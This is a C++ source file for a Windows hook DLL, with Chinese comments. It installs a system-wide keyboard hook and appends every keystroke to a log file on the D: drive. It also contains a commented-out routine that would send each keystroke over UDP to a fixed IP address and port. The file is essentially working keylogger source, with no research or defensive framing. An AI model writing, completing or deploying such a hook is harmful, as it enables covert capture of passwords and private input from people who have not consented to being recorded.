
#include "stdafx.h"
#include<stdio.h>

// hookdll.cpp : 定义 DLL 应用程序的导出函数。
//
HHOOK Hook;
LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam);
void strerror(DWORD errno);
void savelog(const char *s);
void sendudp(const char *s);
extern HMODULE hHookDll;


__declspec(dllexport) void WINAPI UnInstallLaunchEv()
{
	UnhookWindowsHookEx(Hook);
}


__declspec(dllexport) void WINAPI InstallLaunchEv()
{
	Hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)LauncherHook, hHookDll, 0);//最后一个参数全系统调用填0如果就一些应用掉填应用实例的id号
	if (Hook == NULL)
	{
		strerror(GetLastError());
	}
}

LRESULT CALLBACK LauncherHook(int nCode, WPARAM wParam, LPARAM lParam)
{
	LRESULT Result = CallNextHookEx(Hook, nCode, wParam, lParam);
	if (nCode == HC_ACTION)
	{
		char buf[100];
		//memset(buf, 0, sizeof(buf));
		//sprintf(buf, "%u", wParam);
		//printf(buf);
		//send_udp(buf);

		memset(buf, 0, sizeof(buf));
		sprintf(buf, "%x\t%c\t%08x\n", wParam, wParam, lParam);
		savelog(buf);
	}
	return Result;
}

void send_udp(const char *s)
{
	/*init_socket();
	SOCKET st = create_send_socket();
	send_work(st, "192.168.27.254", 8080, s);
	close_socket(st);*/
}

void savelog(const char *s)
{
	FILE *p = fopen("d:\\my.log", "a+");
	fputs(s, p);
	fclose(p);
}

void strerror(DWORD errno)
{
	LPVOID lpMsgBuf;
	FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
		FORMAT_MESSAGE_FROM_SYSTEM |
		FORMAT_MESSAGE_IGNORE_INSERTS,
		NULL,
		errno,//这里放了lasterror的返回值
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),//defaultlanguage
		(LPTSTR)&lpMsgBuf,
		0,
		NULL
		);
	printf("Error : %d %s\n", errno, (LPCTSTR)lpMsgBuf);
	char sbuf[256];
	memset(sbuf, 0, sizeof(sbuf));
	sprintf(sbuf, "Error : %d %s\n", errno, (LPCTSTR)lpMsgBuf);
		savelog(sbuf);
	LocalFree(lpMsgBuf);

	
}


